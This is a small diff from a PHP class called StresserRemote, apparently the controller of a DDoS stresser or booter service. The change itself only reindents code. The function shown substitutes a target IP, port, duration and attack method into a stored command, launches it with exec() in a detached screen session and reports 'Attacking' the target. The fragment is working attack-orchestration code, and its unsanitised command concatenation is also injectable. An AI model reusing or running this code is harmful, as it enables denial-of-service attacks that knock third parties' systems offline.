@@ -50,9 +50,9 @@ class StresserRemote {
 	function attack($IP, $Port, $Time, $Method, $Methods) {
 		$_cmd = $Methods[$Method]['Command'];
 		$Name = str_replace('.', '_', $IP);
-        $arrayFind    = array('[host]', '[port]', '[time]', '[method]');
-        $arrayReplace    = array($IP, $Port, $Time, $Method);
-        $_cmd = str_replace($arrayFind, $arrayReplace, $_cmd);
+       		$arrayFind    = array('[host]', '[port]', '[time]', '[method]');
+        	$arrayReplace    = array($IP, $Port, $Time, $Method);
+        	$_cmd = str_replace($arrayFind, $arrayReplace, $_cmd);
 		exec('cd ' . $Methods[$Method]['Directory'] . ' && ' . 'screen -dmS ' . $Name . ' ' . $_cmd);
 		die('Attacking ' . $IP . ' With Method ' . $Method . ' For Time' . $Time);
 	}
